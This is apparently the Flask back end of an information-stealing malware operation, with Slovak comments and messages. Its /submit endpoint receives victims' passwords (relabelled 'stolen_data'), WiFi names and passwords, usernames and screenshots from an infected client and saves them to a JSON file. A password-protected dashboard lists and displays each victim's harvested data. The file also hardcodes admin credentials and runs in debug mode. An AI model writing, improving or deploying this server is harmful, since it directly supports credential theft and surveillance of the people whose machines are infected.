from flask import Flask, request, jsonify, render_template, redirect, url_for, session, send_file
from functools import wraps
import os
import json
from datetime import datetime
from io import BytesIO
import base64

app = Flask(__name__)
app.secret_key = os.environ.get("SECRET_KEY", "supertajnykluc123")
DATA_FILE = "data.json"

def load_data():
    if not os.path.exists(DATA_FILE):
        return []
    try:
        with open(DATA_FILE, "r", encoding="utf-8") as f:
            return json.load(f)
    except:
        return []

def save_data(data):
    try:
        with open(DATA_FILE, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"Chyba pri ukladaní: {e}")

def login_required(f):
    @wraps(f)
    def decorated_function(*args, **kwargs):
        if 'logged_in' not in session:
            return redirect(url_for('login'))
        return f(*args, **kwargs)
    return decorated_function

@app.route('/submit', methods=['POST'])
def submit_data():
    try:
        data = request.json
        if not data:
            return jsonify({"error": "No JSON data received"}), 400

        # Pridáme čas prijatia
        data['received_at'] = datetime.utcnow().isoformat() + "Z"

        # Kompatibilita s klientom
        if 'passwords' in data:
            data['stolen_data'] = data.pop('passwords')
        elif 'stolen_data' not in data:
            data['stolen_data'] = []

        if 'ssid' in data:
            data['wifi_ssid'] = data.pop('ssid')
        if 'wifi_password' not in data:
            data['wifi_password'] = None

        # Uložíme dáta
        current_data = load_data()
        current_data.append(data)
        save_data(current_data)
        
        print(f"✅ Dáta prijaté: {data.get('user', 'Unknown')} | WiFi: {data.get('wifi_ssid')} | Hesiel: {len(data.get('stolen_data', []))}")
        return jsonify({"status": "ok"}), 200
        
    except Exception as e:
        print(f"❌ Server chyba /submit: {e}")
        return jsonify({"error": str(e)}), 500

@app.route('/login', methods=['GET', 'POST'])
def login():
    error = None
    if request.method == 'POST':
        username = request.form.get('username')
        password = request.form.get('password')
        if username == 'u-Admin' and password == '120202810428Jm!':
            session['logged_in'] = True
            return redirect(url_for('dashboard'))
        else:
            error = "Nesprávne meno alebo heslo"
    return render_template('login.html', error=error)

@app.route('/logout')
def logout():
    session.pop('logged_in', None)
    return redirect(url_for('login'))

@app.route('/')
@login_required
def dashboard():
    data = load_data()
    data = sorted(data, key=lambda x: x.get('received_at', ''), reverse=True)
    return render_template('admin.html', data=data)

@app.route('/detail/<int:index>')
@login_required
def detail(index):
    data = load_data()
    if index < 0 or index >= len(data):
        return "Not found", 404
    entry = data[index]
    return render_template('detail.html', entry=entry, index=index)

@app.route('/screenshot/<int:index>')
@login_required
def screenshot(index):
    data = load_data()
    if index < 0 or index >= len(data):
        return "No screenshot", 404
    entry = data[index]
    b64 = entry.get('screenshot')
    if not b64:
        return "No screenshot", 404
    try:
        img_bytes = base64.b64decode(b64)
        return send_file(BytesIO(img_bytes), mimetype='image/png', download_name=f"screenshot_{index}.png")
    except:
        return "Invalid screenshot", 404

if __name__ == '__main__':
    app.run(host='0.0.0.0', port=int(os.environ.get('PORT', 5000)), debug=True)
